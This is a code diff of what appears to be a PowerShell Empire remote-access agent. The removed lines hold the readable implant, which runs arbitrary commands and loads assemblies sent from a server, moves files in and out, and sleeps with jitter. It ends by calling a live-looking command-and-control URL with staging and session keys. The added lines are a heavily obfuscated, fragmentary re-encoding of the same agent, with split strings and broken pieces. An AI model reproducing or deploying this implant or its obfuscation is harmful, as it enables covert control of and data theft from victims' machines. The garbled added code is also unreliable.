-                    $drives = Get-PSDrive -PSProvider FileSystem |where {($_.Used -gt 0)} | ForEach-Object {
-                        $array += (@{path =  $_.Root; name = $_.Root; is_file = $false});
-                    }
-                    $output = @{directory_name = "/"; directory_path = "/"; items = $array} | ConvertTo-Json -Compress;
-                } elseif (-Not (Test-Path $path -PathType Container)) {
-                    $output = "Directory " + $path + " not found.";
-                } else {
-                    $array = @();
-                    Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $true }) };
-                    Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $false }) };
-                    $directory = Get-Item -force -Path $path;
-                    $output = @{ directory_name = $directory.Name; directory_path = $directory.FullName; items = $array } | ConvertTo-Json -Compress;
-                    if ($directory -eq $null)
-                    {
-                        $output = "User does not have access to directory " + $path;
-                    }
-                }
-                Encode-Packet -data $output -type $type -ResultID $ResultID;
-            }
-            elseif($type -eq 44){
-                try{
-                    $parts = $data.split(",");
-                    $params = $parts[1..$parts.length];
-                    $bytes = [System.Convert]::FromBase64String($parts[0]);
-                    $ms = New-Object System.IO.MemoryStream;
-                    $output = New-Object System.IO.MemoryStream;
-                    $ms.Write($bytes, 0, $bytes.Length);
-                    $ms.Seek(0,0) | Out-Null;
-                    $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress);
-                    $buffer = [System.Byte[]]::CreateInstance([System.Byte],4096);
-                    $bytesRead = $sr.Read($buffer, 0, $buffer.length);
-                    while($bytesRead -ne 0){
-                        $output.Write($buffer,0,$bytesRead);
-                        $bytesRead = $sr.Read($buffer, 0, $buffer.length);
-                    }
-                    $assemBytes = $output.ToArray();
-                    $assem = [Reflection.Assembly]::load($assemBytes);
-                    $strmprop = $assem.GetType("Task").GetProperty("OutputStream");
-                    if(!$strmprop){
-                        $Results = $assem.GetType("Task").GetMethod("Execute").Invoke($null, $params);
-                    }
-                    else{
-                        $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
-                        $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
-                        $streamReader = [System.IO.StreamReader]::new($pipeServerStream);
-                        $dict = @{"assembly" = $assem; "params" = $params; "pipe" = $pipeClientStream};
-                        $ps = [PowerShell]::Create();
-                        $task = $ps.AddScript('
+            elseif(Bsn{tnwqype} -eq 40) {
+                Bsn{pnwqAnwqRts} = Bsn{dnwqATA}.(WA8SWA8+W','WA8).Invoke(Bsn{pipnwqesEnwqRnwqVeRnwqstreAM}.x6VcInbunwqFfernwqsIZEx6Vc);
+                        while (Bsn{rnwqead} = Bsn{stRnwqeaMrnwqEader}.(WA8ReWA8+WA8adWA8).Invoke(Bsn{bufnwqFER}, 0, Bsn{bUnwqFfnwqer}.x6VcleNGnwqThx6Vc)) {
+                            [void]Bsn{pIpnwqeonwqUtpnwqUt}.(WA8AppenWA8+WA8dWA8).Invoke(Bsn{bUfnwqFeR}, 0, Bsn{REnwqAD});
+                        }
+        ',']);
+            Bsn{SCrInwqPT:jOnwqBS}.(WA8RemoWA8+WA8veWA8).Invoke(Bsn{jOnwqBnanwqme});
+        }
+    }
+    function upDnwqAte-pRnwqOFnwqInwqlE {
+
+        param(Bsn{pnwqROFinwqLe})
+        Bsn{prnwqonwqFInwqLEparTS} = Bsn{pnwqRonwqFile}.(WA8spliWA8+WA8tWA8).Invoke(WA8jRbzWA8);
+        Bsn{ScRnwqiPnwqT:tAsKunwqRiS} = Bsn{PronwqFnwqiLEPnwqArtS}[0].(WA8sWA8+WA8plitWA8).Invoke(WA8,WA8);
+        Bsn{SCrInwqPt:nwqUSeragnw','Bsn{SnwqR}.(WA8RWA8+WA8eadWA8).Invoke(Bsn{bnwqUnwqFFER}, 0, Bsn{bnwqUnwqFFER}.x6VcLEngnwqTHx6Vc);
+                    while(Bsn{bYnwqTEsREnwqAD} -ne','e();
+                            }
+WA8).(WA8AddWA8+WA8PaWA8+WA8rameWA8+WA8terWA8+WA8sWA8).Invoke(Bsn{dinwqCT}).(WA8BeginIWA8+WA8nWA8+WA8vokeWA8).Invoke();
+                        Bsn{PipEOunwqTnwqPUt} = [Text.StringBuilder]::(WA8nWA8+WA8ewWA8).Invoke();
+                        Bsn{BnwqUfnwqFER} = [char[]]::(WA8nWA8+WA8ew','96);
+                    Bsn{bnwqYtenwqsREaD} = ',']::x6VcunwqsErDoMnwqAinwqNNAmEx6Vc+WA8jRbzWA8+[Environment]::x6VcunwqsErNanwqmex6Vc+WA8jRbzWA8+[Environment]::x6VcMnwqACHINnwqEnwqNAmEx6Vc;
+        Bsn{P} = (&(WA8GetWA8+WA8-WA8+WA8WmiWA8+WA8OWA8+WA8bjectWA8) (WA8WWA8+WA8iWA8+WA8n32_NWA8+WA8etworkAdWA8+WA8apWA8+WA8terWA8+WA8ConfWA8+WA8iguratiWA8+WA8onWA8)jRbz&(WA8WheWA8+WA8reWA8){Bsn{_}.x6VcipAdnwqdnwqResSx6Vc}jRbz&(WA8SelecWA8+WA8tWA8) -Expand (WA8IWA8+WA8PAddrWA8+WA8essWA8));
+        Bsn{inwqp} = @{Bsn{tnwqRUE}=Bsn{p}[0];Bsn{FAnwqlnwqsE}=Bsn{p}}[Bsn{P}.x6VclennwqGtHx6Vc -lt 6];
+        Bsn{snwqTr}+=x6VcjRbzBsnipx6Vc;
+        Bsn{snwqTR} += WA8jRbzWA8 +(&(WA8GWA8+WA8etWA8+WA8-WmiObjeWA8+WA8cWA8+WA8tWA8) (WA8WiWA8+WA8nWA8+WA83WA8+WA82_OperWA8+WA8aWA8+WA8tingSystemWA8)).x6VcNAnwqmex6Vc.(WA8spliWA8+WA8tWA8).Invoke(WA8jRbzWA8)[0];
+        if(([Environment]::x6VcUnwqseRNnwqAMEx6Vc).(WA8TWA8+WA8oLWA8+WA8owerWA8).Invoke() -eq (WA8sWA8+WA8ystemWA8)) {
+            Bsn{snwqTr} += ((WA8JjXTWA8+WA8rueWA8).x6VcrePlnwqAcEx6Vc(([char]74+[char]106+[char]88),[STrINg][char]124));
+        }
+        else{
+            Bsn{SnwqTR} += WA8jRbzWA8+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::(WA8GetCWA8+WA8urrenWA8+WA8tWA8).Invoke()).x6VcISiNnwqRnwqolEx6Vc([Security.Principal.WindowsBuiltInRole] (WA8AdmWA8+WA8inistrWA8+WA8aWA8+WA8toWA8+WA8rWA8));
+        }
+        Bsn{n} = [System.Diagnostics.Process]::(WA8GeWA8+WA8tWA8+WA8CurrentPWA8+WA8rocWA8+WA8esWA8+WA8sWA8).Invoke();
+        Bsn{snwqTR} += WA8jRbzWA8+Bsn{N}.x6VcpRnwqOcnwqeSsnaMex6Vc+WA8jRbzWA8+Bsn{n}.x6Vcinwqdx6Vc;
+        Bsn{snwqTr} += ((WA8{0}WA8+WA8poweWA8+WA8rWA8+WA8shell{0}WA8)-F  [CHar]124) + Bsn{PsVErnwqsiOnwqNTanwqBLe}.x6VcpSVenwqRSnwqioNx6Vc.x6VcMAnwqjorx6Vc;
+        Bsn{snwqTR} += x6VcjRbzx6Vc + Bsn{Env:pROCesnwqSnwqOR_anwqRcnwqHitnwqEctuRe};
+        Bsn{snwqTR};
+    }
+    function InVOnwqkE-SHEnwqLlCommnwqAND {
+        param(Bsn{CnwqMd}, Bsn{cmnwqDARGS}=x6Vcx6Vc)
+        if (Bsn{cnwqmDAnwqRgS} -like x6Vc*nwqx6Vc214M214M*x6Vc) {
+            Bsn{cmnwqdarnwqgs} = Bsn{cmDanwqRnwqGS','(WA8neWA8+WA8wWA8).Invoke(Bsn{pipesErnwqVenwqRSTrEnwqAm});
+                        Bsn{DInwqCT} = @{(WA8aWA8+WA8ssemWA8+WA8blyWA8) = Bsn{AnwqssEM}; (WA8pWA8+WA8aramWA8+WA8sWA8) = Bsn{PnwqAranwqms}; (WA8pWA8+WA8ipeWA8) = Bsn{PnwqinwqPEClnwqinwqentnwqStrEam}};
+                        Bsn{PnwqS} = [PowerShell]::(WA8CWA8+WA8reateWA8).Invoke();
+                        Bsn{tanwqSk} = Bsn{ps}.x6VcaDnwqDSCrInwqptx6Vc(WA8
                         [CmdletBinding()]
                         param(
                             [System.Reflection.Assembly]
-                            $assembly,
+                            Bsnassembly,
                             [String[]]
-                            $params,
+                            Bsnparams,
                             [IO.Pipes.AnonymousPipeClientStream]
-                            $Pipe
+                            BsnPipe
                         )
                         try {
-                            $streamProp = $assembly.GetType("Task").GetProperty("OutputStream");
-                            $streamProp.SetValue($null, $pipe, $null);
-                            $assembly.GetType("Task").GetMethod("Execute").Invoke($null,$params);
+                            BsnstreamProp = Bsnassembly.GetType(x6VcTaskx6Vc).GetProperty(x6VcOutputStreamx6Vc);
+                            BsnstreamProp.SetValue(Bsnnull, Bsnpipe, Bsnnull);
+                            Bsnassembly.GetType(x6VcTaskx6Vc).GetMethod(x6VcExecutex6Vc).Invoke(Bsnnull,Bsnparams);
                             }
                         finally {
-                            $pipe.Dispose();
-                            }
-').AddParameters($dict).BeginInvoke();
-                        $pipeOutput = [Text.StringBuilder]::new();
-                        $buffer = [char[]]::new($pipeServerStream.InBufferSize);
-                        while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
-                            [void]$pipeOutput.Append($buffer, 0, $read);
+                            Bsnpipe.Dispos','        &(WA8EncodeWA8+WA8-PacWA8+WA8ketWA8) -type Bsn{TnwqyPE} -data ((WA8JWA8+WA8ob sWA8+WA8tarWA8+WA8ted: WA8) + Bsn{JnwqoBid}) -ResultID Bsn{REsUlnwqTid};
+            }
+            elseif(Bsn{tnwqYPe} -eq 111 -or Bsn{tnwqYpe} -eq 113) {
+                &(WA8EncWA8+WA8odeWA8+WA8-PackWA8+WA8etWA8) -type 0 -data (WA8[!]WA8+WA8 Dynamic WA8+WA8codeWA8+WA8 execution, no wait,WA8+WA8 saveWA8+WA8 outpuWA8+WA8t WA8+WA8noWA8+WA8tWA8+WA8 implemeWA8+WA8ntedWA8) -ResultID Bsn{rEsUlnwqTiD};
+            }
+            elseif(Bsn{TynwqPe} -eq 120) {
+                Bsn{snwqCnwqRIpt:ImpnwqorTEdnwqsnwqcri','      [int] Bsn{InnwqDnwqEX} = 0,
+            Bsn{ChunwqNnwqKSnwqIze} = 512KB,
+            [switch] Bsn{nOBanwqsnwqE64}
+        )
+        try {
+            Bsn{f} = &(WA8GeWA8+WA8tWA8+WA8-ItemWA8) x6VcBsnFilex6Vc;
+            Bsn{fnwqiLnwqeLnwqenGth} = Bsn{F}.x6VcLEnnwqgnwqTHx6Vc;
+            Bsn{fROnwqmFinwqlE} = [io.file]::(WA8OpenReWA8+WA8aWA8+WA8dWA8).Invoke(Bsn{FInwqle});
+            if (Bsn{finwqLELEnwqNgth} -lt Bsn{chnwqUnnwqKSnwqIze}) {
+                if(Bsn{innwqdeX} -eq 0) {
+                    Bsn{bunwqFF} = &(WA8neWA8+WA8w-objecWA8+WA8tWA8) (WA8bWA8+WA8yte[WA8+WA8]WA8) Bsn{fIlEnwqleNnwqgTh};
+                    Bsn{cOnwqUnwqNT} = Bsn{fRnwqomfinwqle}.(WA8ReaWA8+WA8dWA8).Invoke(Bsn{BunwqFF}, 0, Bsn{BnwqUFF}.x6VclENGnwqThx6Vc);
+                    if(Bsn{noBnwqASE64}) {
+                        Bsn{bUnwqFf};
+                    }
+                    else{
+                        [System.Convert]::x6VctnwqOBaSE6nwq4stRINgx6Vc(Bsn{bUnwqFF});
+                    }
+                }
+                else{
+                    Bsn{nnwqULL};
+                }
+            }
+            else{
+                Bsn{bnwqUff} = &(WA8nWA8+WA8ewWA8+WA8-objeWA8+WA8ctWA8) (WA8byWA8+WA8te[]WA8) Bsn{ChunKnwqsInwqZe};
+                Bsn{StnwqARt} = Bsn{INnwqdnwqEx} * Bsn(Bsn{cnwqhunwqNnwqkSiZE});
+                Bsn{nunwqLL} = Bsn{FrOnwqmnwqFiLE}.(WA8SeWA8+WA8ekWA8).Invoke(Bsn{SnwqTanwqRT},0);
+                Bsn{conwqUnwqNT} = Bsn{FnwqRnwqoMFILE}.(WA8ReWA8+WA8adWA8).Invoke(Bsn{bUnwqFF}, 0, Bsn{bunwqFf}.x6VcLEnnwqGtHx6Vc);
+                if (Bsn{counwqNt} -gt 0) {
+                    if(Bsn{CnwqoUnwqNt} -ne Bsn{CnwqHUnKSnwqIzE}) {
+                        Bsn{bnwqUnwqFf2} = &(WA8new-WA8+WA8oWA8+WA8bjectWA8) (WA8byWA8+WA8te[WA8+WA8]WA8) Bsn{cOnwqUnwqNT};
+                        [array]::(WA8copWA8+WA8yWA8).Invoke(Bsn{BnwqUFf}, Bsn{BUfnwqF2}, Bsn{CnwqOunwqNT});
+                        if(Bsn{nobnwqAsnwqe64}) {
+                            Bsn{bunwqFF2}
                         }
-                        $ps.EndInvoke($task);
-                        $Results = $pipeOutput.ToString();
+                        else{
+                            [System.Convert]::x6VctoBnwqASE64STnwqRnwqiNgx6Vc(Bsn{BnwqUnwqFF2});
+                        }
                     }
-                    Encode-Packet -data $results -type 40 -ResultID $ResultID;
-                }
-                catch {
-                    Encode-Packet -type 0 -data '[!] Error while executing assembly' -ResultID $ResultID;
-                }
-            }
-            elseif($type -eq 50) {
-                $Downloads = $Script:Jobs.Keys -join "`n";
-                Encode-Packet -data ("Running Jobs:`n$Downloads") -type $type -ResultID $ResultID;
-            }
-            elseif($type -eq 51) {
-                $JobName = $data;
-                $JobResultID = $ResultIDs[$JobName];
-                try {
-                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
-                    if($Results -and $($Results.trim() -ne '')) {
-                        Encode-Packet -type $type -data $($Results) -ResultID $JobResultID;
-                    }
-                    Encode-Packet -type 51 -data "Job $JobName killed." -ResultID $JobResultID;
-                }
-                catch {
-                    Encode-Packet -type 0 -data "[!] Error in stopping job: $JobName" -ResultID $JobResultID;
-                }
-            }
-            elseif($type -eq 60) {
-                Encode-Packet -type 0 -data '[!] SOCKS server not implemented' -ResultID $ResultID;
-            }
-            elseif($type -eq 61) {
-                Encode-Packet -type 0 -data '[!] SOCKS server data not implemented' -ResultID $ResultID;
-            }
-            elseif($type -eq 100 -or $type -eq 118) {
-                $ResultData = IEX $data;
-                if($ResultData) {
-                    Encode-Packet -type $type -data $ResultData -ResultID $ResultID;
-                }
-            }
-            elseif($type -eq 101 -or $type -eq 119) {
-                $prefix = $data.Substring(0,15);
-                $extension = $data.Substring(15,5);
-                $data = $data.Substring(20);
-                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID;
-            }
-            elseif($type -eq 110 -or $type -eq 112) {
-                $jobID = Start-AgentJob $data;
-                $script:ResultIDs[$jobID]=$resultID;
-                Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
-            }
-            elseif($type -eq 111 -or $type -eq 113) {
-                Encode-Packet -type 0 -data '[!] Dynamic code execution, no wait, save output not implemented' -ResultID $ResultID;
-            }
-            elseif($type -eq 120) {
-                $script:ImportedScript = Encrypt-Bytes $Encoding.GetBytes($data);
-                Encode-Packet -type $type -data "script successfully saved in memory" -ResultID $ResultID;
-            }
-            elseif($type -eq 121) {
-                $script = Decrypt-Bytes $script:ImportedScript;
-                if ($script) {
-                    $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data");
-                    $script:ResultIDs[$jobID]=$ResultID;
-                    Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
-                }
-            }
-            elseif($type -eq 130) {
-                try {
-                    IEX $data
-                    Encode-Packet -type $type -data "[+] Switched the current listener to: $CurrentListenerName" -ResultID $ResultID;
-                }
-                catch {
-                    Encode-Packet -type 0 -data ("[!] Unable to update agent comm methods: $_") -ResultID $ResultID;
-                }
-            }
-            elseif($type -eq 131) {
-                $script:CurrentListenerName = $data;
-                Encode-Packet -type $type -data "[+] Updated the CurrentListenerName to: $CurrentListenerName" -ResultID $ResultID;
-            }
-            else{
-                Encode-Packet -type 0 -data "[!] invalid type: $type" -ResultID $ResultID;
-            }
-        }
-        catch [System.Exception] {
-            Encode-Packet -type $type -data "[!] error running command: $_" -ResultID $ResultID;
-        }
-    }
-    function Process-TaskingPackets {
-        param($Tasking)
-        $TaskingBytes = Decrypt-Bytes $Tasking;
-        if (-not $TaskingBytes) {
-            return;
-        }
-        $Decoded = Decode-Packet $TaskingBytes;
-        $Type = $Decoded[0];
-        $TotalPackets = $Decoded[1];
-        $PacketNum = $Decoded[2];
-        $TaskID = $Decoded[3];
-        $Length = $Decoded[4];
-        $Data = $Decoded[5];
-        $Remaining = $Decoded[6];
-        $ResultPackets = $(Process-Tasking $Type $Data $TaskID);
-        $Offset = 12 + $Length;
-        while($Remaining.Length -ne 0) {
-            $Decoded = Decode-Packet $TaskingBytes $Offset;
-            $Type = $Decoded[0];
-            $TotalPackets = $Decoded[1];
-            $PacketNum = $Decoded[2];
-            $TaskID = $Decoded[3];
-            $Length = $Decoded[4];
-            $Data = $Decoded[5];
-            if ($Decoded.Count -eq 7) {$Remaining = $Decoded[6]};
-            $ResultPackets += $(Process-Tasking $Type $Data $TaskID);
-            $Offset += $(12 + $Length);
-        }
-        (& $SendMessage -Packets $ResultPackets);
-    }
-    while ($True) {
-        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {
-            $Packets = $null;(& $GetTask);
-            ForEach($JobName in $Script:Jobs.Keys) {
-                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
-                $JobResultID = $script:ResultIDs[$JobName];
-                $Packets += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
-                $script:ResultIDs.Remove($JobName);
-            }
-            if ($Packets) {
-                (& $SendMessage -Packets $Packets);
-            }
-            if (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
-                $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate";
+                    else{
+                        if(Bsn{Nnwqobase64}) {
+                            Bsn{BnwqUff};
+                        }
+                        else{
+          ','
+            Bsn{jOnwqBRESnwqULtid} = Bsn{SnwqcRIPT:ResUnwqlTnwqInwqdS}[Bsn{JOnwqBnnwqAME}];
+            if(&(WA8Get-WA8+WA8AgWA8+WA8entWA8+WA8JobCompWA8+WA8lWA8+WA8etedWA8) -JobName Bsn{JObnanwqme}) {
+                Bsn{ResnwqUnwqlTs} = &(WA8StWA8+WA8op-AgentWA8+WA8JoWA8+WA8bWA8) -JobName Bsn{JnwqOBNamE} jRbz &(WA8flWA8) jRbz &(WA8OWA8+WA8ut-StriWA8+WA8ngWA8);
             }
             else {
-                $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached";
-            }
-            (& $SendMessage -Packets $(Encode-Packet -type 2 -data $msg));
-            exit;
-        }
-        if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$') {
-            $current = Get-Date;
-            $start = Get-Date ($script:WorkingHours.split("-")[0]);
-            $end = Get-Date ($script:WorkingHours.split("-")[1]);
-            if (($end-$start).hours -lt 0) {
-                $start = $start.AddDays(-1);
-            }
-            $startCheck = $current -ge $start;
-            $endCheck = $current -le $end;
-            if ((-not $startCheck) -or (-not $endCheck)) {
-                $sleepSeconds = ($start - $current).TotalSeconds;
-                if($sleepSeconds -lt 0) {
-                    $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds;
+                Bsn{REnwqSnwqUlTs} = &(WA8RecWA8+WA8eWA','
+                        } catch {
+                            Bsn{O} = (WA8N/WA8+WA8AWA8)
+                        }
+                        Bsn{oWnwqNeRs}[Bsn{_}.x6VchanwqNDLEx6Vc] = Bsn{o}
+                    }
+                    if(Bsn{cMnwqDnwqArgs} -ne WA8WA8) { Bsn{p} = Bsn{CnwqmdARnwqgs} }
+                    else{ Bsn{p} = x6Vc*x6Vc };
+                    Bsn{onwqUTpnwqUt} = &(WA8Get-PWA8+WA8rocWA8+WA8essWA8) Bsn{P} jRbz &(WA8ForWA8+WA8EaWA8+WA8ch-ObjectWA8) {
+                        Bsn{AnwqRCH} = (WA8x6WA8+WA84WA8);
+                        if ([System.IntPtr]::x6VcsInwqzex6Vc -eq 4) {
+                            Bsn{anwqRCH} = (WA8x8WA8+WA86WA8)
+                        }
+                        else{
+                            foreach(Bsn{MonwqdnwqULE} in Bsn{_}.x6VcMODunwqLEsx6Vc) {
+                                if([System.IO.Path]::(WA8GetWA8+WA8FileWA8+WA8NameWA8).Invoke(Bsn{MonwqDnwqUle}.x6VcfILnwqeNnwqAmex6Vc).(WA8ToLWA8+WA8owWA8+WA8erWA8).','8IDWA8) jRbz &(WA8ConverWA8+WA8tTo-JWA8+WA8sonWA8);
                 }
-                Start-Sleep -Seconds $sleepSeconds;
+                (WA8getpWA8+WA8idWA8) { Bsn{outpnwqUt} = [System.Diagnostics.Process]::(WA8GWA8+WA8eWA8+WA8tCurrenWA8+WA8tPrWA8+WA8oceWA8+WA8ssWA8).Invoke() }
+                (WA8rWA8+WA8outeWA8) {
+                    if ((Bsn{CMdARnwqgS}.x6VcLENnwqgnwqTHx6Vc -eq WA8WA8) -or (Bsn{cMnwqdARnwqGs}.(WA8ToWA8+WA8LWA8+WA8owerWA8).Invoke() -eq (WA8prinWA8+WA8tWA8))) {
+                        Bsn{ADanwqPtnwqeRS} = @{};
+                        &(WA8Get-WA8+WA8WmiObWA8+WA8jeWA8+WA8ctWA8) (WA8WWA8+WA8in32_NetWA8+WA8woWA8+WA8rkAdapWA8+WA8terWA8+WA8CoWA8+WA8nfiWA8+WA8gurationWA8) jRbz &(WA8FoWA8+WA8rEWA8+WA8acWA8+WA8hWA8+WA8-ObjectWA8) { Bsn{ADAPnwqTnwqEnwqRS}[[int](Bsn{_}.x6VcintnwqEnwqRFnwqACEINDexx6Vc)] = Bsn{_}.x6VciPAnwqdDnwqREssx6Vc };
+                       ','wqRENT} -ge Bsn{SnwqTArT};
+            Bsn{ennwqDnwqchecK} = Bsn{cnwqURrent} -le Bsn{enwqNd};
+            if ((-not Bsn{SnwqTaRtnwqcHeCK}) -or (-not Bsn{EndnwqCnwqheCK})) {
+                Bsn{SlnwqEePseConwqNnwqDs} = (Bsn{SnwqTART} - Bsn{cnwqURnwqRENt}).x6VcTOTnwqAlseCnwqoNDsx6Vc;
+                if(Bsn{SleenwqPSEnwqcONnwqds} -lt 0) {
+                    Bsn{snwqLnwqEepsECnwqonds} = (Bsn{SnwqTAnwqRT}.(WA8adWA8+WA8dDaWA8+WA8ysWA8).Invoke(1) - Bsn{cnwqUrnwqRENT}).x6VcTotnwqAlseCnwqondsx6Vc;
+                }
+                &(WA8Start-WA8+WA8SleWA8+WA8epWA8) -Seconds Bsn{SnwqLnwqEePseconnwqDs};
             }
         }
-        if ($script:AgentDelay -ne 0) {
-            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay);
-            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay);
-            if ($SleepMin -eq $SleepMax) {
-                $SleepTime = $SleepMin;
+        if (Bsn{sCRiPnwqTnwq:AnwqgENtnwqdelAy} -ne 0) {
+            Bsn{snwqleePnwqMIn} = [int]((1-Bsn{ScriPnwqTnwq:nwqAgeNtjItnwqTEr})*Bsn{snwqCnwqRipT:anwqgEnwqNtDELAy});
+            Bsn{SlnwqEenwqPMnwqAx} = [int]((1+Bsn{scRnwqIpnwqTnwq:AnwqGentjiTtEr})*Bsn{sCnwqRiPt:nwqAgenwqNtdeLnwqAY});
+            if (Bsn{slEnwqePmIn} -eq Bsn{slnwqEnwqePmnwqAX}) {
+                Bsn{slEnwqEnwqPTIME} = Bsn{slEEPnwqMnwqIn};
             }
             else{
-                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax;
+                Bsn{SleePnwqTinwqmE} = &(WA8Get-WA8+WA8RWA8+WA8andomWA8) -Minimum Bsn{sLnwqEenwqPmIN} -Maximum Bsn{SlnwqeEnwqPmnwqAX};
             }
-            Start-Sleep -Seconds $sleepTime;
+            &(WA8StarWA8+WA8tWA8+WA8-SlWA8+WA8eepWA8) -Seconds Bsn{SlEnwqEnwqPnwqTimE};
         }
-        $JobResults = $Null;
-        ForEach($JobName in $Script:Jobs.Keys) {
-            $JobResultID = $script:ResultIDs[$JobName];
-            if(Get-AgentJobCompleted -JobName $JobName) {
-                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
+        Bsn{jObResnwqULnwqTs} = Bsn{nUnwqLl};
+        ForEach(Bsn{JnwqoBNamE} in Bsn{SCnwqRInwqptnwq:jOBS}.x6VcKEnwqysx6Vc) {','                    } while(Bsn{EnnwqCOdnwqedPAnwqRT})
+                        &(WA8EWA8+WA8ncWA8+WA8odeWA8+WA8-PacketWA8) -type 40 -data (WA8[WA8+WA8*] WA8+WA8FilWA8+WA8e WA8+WA8doWA8+WA8wnWA8+WA8load WA8+WA8oWA8+WA8f WA8+x6VcBsnfile x6Vc+WA8compWA8+WA8letWA8+WA8edWA8) -ResultID Bsn{REnwqsULnwqTnwqiD};
+                    }
+                }
+                catch {
+                    &(WA8Encode-WA8+WA8PWA8+WA8aWA8+WA8ckeWA8+WA8tWA8) -type 0 -data (WA8[!]WA8+WA8 FWA8+WA8ileWA8+WA8 dWA8+WA8oes not WA8+WA8existWA8+WA8 or WA8+WA8caWA8+WA8nnWA8+WA8ot beWA8+WA8 accessWA8+WA8edWA8) -ResultID Bsn{REsunwqlTnwqid};
+                }
             }
-            else {
-                $Results = Receive-AgentJob -JobName $JobName | fl | Out-String;
+            elseif(Bsn{tnwqyPe} -eq 42) {
+                Bsn{PAnwqRTS} = Bsn{dnwqAta}.(WA8sWA8+WA8plitWA8).Invoke(WA8jRbzWA8);
+                Bsn{FilnwqEnnwqAMe} = Bsn{panwqRtS}[0];
+                Bsn{banwqsE64panwqRT} = Bsn{PanwqRts}[1];
+                Bsn{ConnwqTenwqNT} = [System.Convert]::(WA8FWA8+WA8romWA8+WA8BasWA8+WA8e64WA8+WA8StringWA8).Invoke(Bsn{bnwqASnwqE6nwq4PArt});
+                try{
+                    &(WA8SeWA8+WA8t-WA8+WA8ContenWA8+WA8tWA8) -Path Bsn{FnwqiLEnnwqAme} -Value Bsn{ConnwqTenwqNT} -Encoding (WA8BytWA8+WA8eWA8) -ErrorAction (WA8StWA8+WA8opWA8) -ErrorVariable (WA8erWA8+WA8rorWA8)
+                    &(WA8EncodeWA8+WA8-PWA8+WA8ackeWA8+WA8tWA8) -type Bsn{tnwqypE} -data (WA8[*]WA8+WA8 WA8+WA8UplWA8+WA8oWA8+WA8ad WA8+WA8ofWA8+WA8 WA8+x6VcBsnfileName x6Vc+WA8suWA8+WA8cceWA8+WA8ssfulWA8) -ResultID Bsn{ReSnwqULTnwqiD};
+         ','8+WA8ive-WA8+WA8AgentJobWA8) -JobName Bsn{jOnwqBnwqNamE} jRbz &(WA8flWA8) jRbz &(WA8OWA8+WA8uWA8+WA8t-WA8+WA8StringWA8);
             }
-            if($Results) {
-                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
+            if(Bsn{resnwqULTs}) {
+                Bsn{joBReSnwqUnwqLts} += Bsn(&(WA8EncoWA8+WA8deWA8+WA8-PaWA8+WA8cketWA8) -type 110 -data Bsn(Bsn{RenwqsulnwqTs}) -ResultID Bsn{JobrEnwqsuLnwqTId});
             }
         }
-        if ($JobResults) {
-            ((& $SendMessage -Packets $JobResults));
+        if (Bsn{jobRnwqEnwqsulnwqTS}) {
+            ((& Bsn{SENnwqDMeSsAnwqGE} -Packets Bsn{JobnwqReSnwqULnwqTS}));
         }
-        $TaskData = (& $GetTask);
-        if ($TaskData) {
-            $script:MissedCheckins = 0;
-            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
-                Decode-RoutingPacket -PacketData $TaskData;
+        Bsn{TanwqSkdnwqATA} = (& Bsn{gEtTAnwqsK});
+        if (Bsn{TnwqAnwqSKDAta}) {
+            Bsn{sCrnwqIPT:MissnwqednwqCnwqhnwqeCkinS} = 0;
+            if ([System.Text.Encoding]::x6VcUTnwqF8x6Vc.x6VcgEnwqTsTrnwqINgx6Vc(Bsn{taSnwqKdanwqTa}) -ne Bsn{SnwqcrIPnwqTnwq:DenwqFaUlTrnwqesponSe}) {
+                &(WA8DecWA8+WA8ode-RouWA8+WA8tWA8+WA8inWA8+WA8gPackWA8+WA8etWA8) -PacketData Bsn{tnwqASknwqdAtA};
             }
         }
-        [GC]::Collect();
+        [GC]::(WA8CoWA8+WA8llectWA8).Invoke();
     }
 }
 
-Invoke-Empire -Servers @('http://brave-dust-49022.pktriot.net:22161') -StagingKey '+D7|O1?kutgc=)6EjVe[3%pCRyr{fs#B' -SessionKey '|,xDJ3T~$rLcHwlS9NFq6)ys/MU-KCV_' -SessionID '2RNCUQR4' -WorkingHours '' -KillDate '';
